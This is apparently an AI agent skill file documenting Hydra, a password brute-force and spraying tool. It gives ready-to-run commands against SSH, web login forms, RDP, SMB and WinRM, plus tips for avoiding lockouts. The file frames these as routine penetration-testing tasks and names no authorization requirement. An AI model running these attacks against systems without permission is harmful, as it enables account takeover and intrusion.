---
name: hydra
description: "Online brute-force and password spraying tool supporting 50+ protocols (SSH, HTTP, FTP, SMB, RDP, WinRM, and more). Use when asked to brute-force logins, perform password spraying, test default credentials, or attack authentication on any network service."
license: AGPL-3.0
compatibility: "Linux, Windows, macOS. Install: apt install hydra (Kali pre-installed) or build from source. Windows: use Kali WSL."
metadata:
  author: AeonDave
  version: "1.0"
---

# Hydra

Fast, parallelized online password cracker for 50+ protocols.

## Quick Start

```bash
# SSH brute-force
hydra -l admin -P passwords.txt ssh://192.168.1.10

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Multiple users + passwords
hydra -L users.txt -P passwords.txt ssh://192.168.1.10
```

## Core Flags

| Flag | Description |
|------|-------------|
| `-l <user>` | Single username |
| `-L <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-u` | Loop users before passwords (default: passwords first) |
| `-C <file>` | Colon-delimited user:pass list |
| `-t <n>` | Threads per host (default 16) |
| `-T <n>` | Total parallel targets |
| `-s <port>` | Custom port |
| `-S` | Use SSL/TLS |
| `-o <file>` | Output found credentials |
| `-f` | Stop after first valid pair (per host) |
| `-F` | Stop after first valid pair (all hosts) |
| `-v` | Verbose |
| `-V` | Very verbose (show each attempt) |
| `-d` | Debug |
| `-R` | Restore previous session |
| `-e nsr` | Try: n=empty pass, s=user as pass, r=reversed user |

## Supported Modules (Common)

`ssh`, `ftp`, `http-get`, `http-post-form`, `https-post-form`, `smb`, `rdp`, `winrm`, `imap`, `pop3`, `smtp`, `mysql`, `postgres`, `mssql`, `telnet`, `vnc`, `ldap2`, `redis`

## Common Workflows

```bash
# SSH with user list
hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 4

# HTTP form login
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/admin/login.php:username=^USER^&password=^PASS^:Wrong password"

# RDP brute-force
hydra -l administrator -P passwords.txt rdp://10.10.10.10

# FTP
hydra -l ftp -P passwords.txt ftp://10.10.10.10

# SMB password spray (single password, many users)
hydra -L users.txt -p "Summer2024!" smb://10.10.10.10

# WinRM
hydra -l administrator -P passwords.txt winrm://10.10.10.10

# Rate-limited (avoid lockouts)
hydra -l admin -P passwords.txt ssh://10.10.10.10 -t 1 -W 3
```

## Tips

- Use `-e nsr` for quick wins (null, same as user, reversed)
- Set `-t 1-4` for protocols with lockout policies (RDP, SMB, WinRM)
- For HTTP forms: identify `failure_message` from the response body

## Resources

| File | When to load |
|------|--------------|
| `references/protocols.md` | Module syntax for each protocol, POST form detection, HTTPS handling |
